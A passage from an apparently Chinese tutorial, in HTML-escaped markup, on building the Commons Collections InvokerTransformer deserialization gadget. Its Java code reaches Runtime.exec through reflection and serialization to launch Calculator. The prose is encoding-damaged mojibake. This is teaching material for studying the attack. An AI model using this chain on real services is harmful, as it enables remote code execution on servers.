&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;InvocationTargetException&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ex&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FunctorException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;InvokerTransformer: The method &amp;#39;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iMethodName&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;#39; on &amp;#39;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;#39; threw an exception&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ex&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ˜¯ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œä¼¼æˆç›¸è¯†ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬ä¹‹å‰åˆ©ç”¨åå°„å¤„ç†çš„Runtimeç±»åªæƒ³è®¡ç®—å™¨çš„ä»£ç ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Runtime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getRuntime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//æ­£å°„è°ƒç”¨
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;myRuntime&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;forName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;java.lang.Runtime&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getMethod&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;getRuntime&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;invoke&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//åå°„è°ƒç”¨
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Method&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;forName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;java.lang.Runtime&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getMethod&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;exec&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;invoke&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;myRuntime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ˜¯ä¸æ˜¯è¯¥æœ‰çš„éƒ½æœ‰äº†ï¼Œå¥½ï¼Œæˆ‘ä»¬ç»§ç»­çœ‹ä¸‹æ€ä¹ˆä½¿ç”¨InvokerTransformerç±»å»åˆ©ç”¨ï¼Œå…ˆæ¥çœ‹ä¸‹Newä¸€ä¸ªå¯¹è±¡éœ€è¦ä¼ å…¥ä»€ä¹ˆå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯å­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªæ˜¯ç±»æ•°ç»„ï¼Œç¬¬ä¸‰ä¸ªæ˜¯å¯¹è±¡å‚æ•°ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;InvokerTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;methodName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;paramTypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;super&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;iMethodName&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;methodName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;iParamTypes&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;paramTypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;iArgs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬å¯ä»¥å†™æˆä¸‹é¢è¿™æ ·å°±èƒ½è§¦å‘è®¡ç®—å™¨äº†ï¼Œç¬¬ä¸€ä¸ªä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„execæ–¹æ³•ï¼Œç¬¬äºŒä¸ªè¦å†™æˆnew Class[]å°±æ˜¯è¦newä¸€ä¸ªclassæ•°ç»„ç„¶åæŠŠç±»çš„ç±»å‹æ”¾è¿›æ¥ç»™å®ƒå¤„ç†ï¼Œç¬¬ä¸‰ä¸ªå°±æ˜¯å¯¹åº”ä¸Šé¢çš„new Object[]ã€‚å¦‚æœè¿˜æ˜¯çœ‹ä¸æ‡‚å¯ä»¥æŠŠRuntimeåå°„çš„ä»£ç å¸¦å…¥åˆ°transformæ–¹æ³•å°±ä¸€ç›®äº†ç„¶äº†ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;forName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;java.lang.Runtime&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getMethod&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;getRuntime&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;invoke&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iMethodName&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;exec&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iParamTypes&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iArgs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;InvokerTransformer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;invokerTransformer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;InvokerTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;iMethodName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iParamTypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iArgs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;invokerTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;transform&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;æ³¨æ„ï¼Œå¦‚æœä¸çŸ¥é“InvokerTransformerå¯¹äºå®é™…å¼€å‘åˆ°åº•å‘æŒ¥äº†ä»€ä¹ˆä½œç”¨ï¼Œè¿™ä¸ªæˆ‘ä»¬å…ˆä¸è¦æ·±ç©¶ï¼Œæˆ‘ä»¬åªç”¨çŸ¥é“è¿™ä¸ªç±»å’Œè¿™ä¸ªå‡½æ•°èƒ½åˆ©ç”¨ï¼Œè§¦å‘æˆ‘ä»¬çš„ä»£ç å³å¯ï¼Œå…¶ä»–çš„ä¸‹é¢å¤„ç†å®Œæ‰€æœ‰çš„ç±»ä¼šä¸€ä¸€è§£é‡Š&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æˆ‘ä»¬æŠŠè¿™æ®µå†™æˆåºåˆ—åŒ–å†ååºåˆ—åŒ–çœ‹çœ‹ï¼Œçœ‹åˆ°æ˜¯å¯ä»¥æ­£å¸¸è¿è¡Œè®¡ç®—å™¨çš„ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iMethodName&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;exec&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iParamTypes&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iArgs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;InvokerTransformer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;invokerTransformer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;InvokerTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;iMethodName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iParamTypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iArgs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ByteArrayOutputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;barr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ByteArrayOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ObjectOutputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;oss&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ObjectOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;barr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;oss&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;writeObject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;invokerTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;oss&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;barr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ObjectInputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ois&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ObjectInputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ByteArrayInputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;barr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;toByteArray&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;InvokerTransformer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;InvokerTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ois&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;readObject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;forName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;java.lang.Runtime&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getMethod&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;getRuntime&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;invoke&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;transform&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä½†æ˜¯æˆ‘ä»¬ä¸»è¦åˆ°çš„æ˜¯inputçš„å˜é‡ï¼Œæˆ‘ä»¬è¦ä¸»åŠ¨å»åšèµ‹å€¼ï¼Œè¦çŸ¥é“æœåŠ¡å™¨ä¸å¯èƒ½ä¼šå†™ä¸€ä¸ªç»™ä½ ï¼Œæˆ‘ä»¬è¦åœ¨æ‰§è¡ŒreadObjectçš„æ—¶å€™å°±æœ‰æˆ‘ä»¬çš„inputçš„å†…å®¹ï¼Œè¦è§£å†³ä¼ inputå€¼é—®é¢˜ï¼Œæˆ‘ä»¬çš„æœ€å¸Œæœ›çš„å°±æ˜¯æœ‰ä¸€ä¸ªæ–¹æ³•å¯ä»¥åœ¨å†…éƒ¨å°±å¸®æˆ‘ä»¬ä¼ å…¥å±é™©çš„å€¼ã€‚&lt;/p&gt;
&lt;p&gt;è·Ÿåˆ°è¿™é‡Œï¼Œå¤§å®¶å¯èƒ½ä¹Ÿä¼šæœ‰ç‚¹è¿·èŒ«ï¼Œæˆ‘ä»¬é‡æ–°å›åˆ°æˆ‘ä»¬æœ€ç»ˆç›®çš„ï¼šèƒ½è¢«readObjectåˆ©ç”¨åˆ°çš„ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è·³åˆ°AnnotationInvocationHandlerè¿™ä¸ªç±»ï¼Œè¿™ä¸ªJDKè‡ªå¸¦çš„ï¼Œè€Œä¸”è¿™ä¸ªç±»çš„readObjecté‡å†™äº†ï¼ŒåŒæ—¶ä¹Ÿç»§æ‰¿Serializableç±»ï¼š&lt;/p&gt;
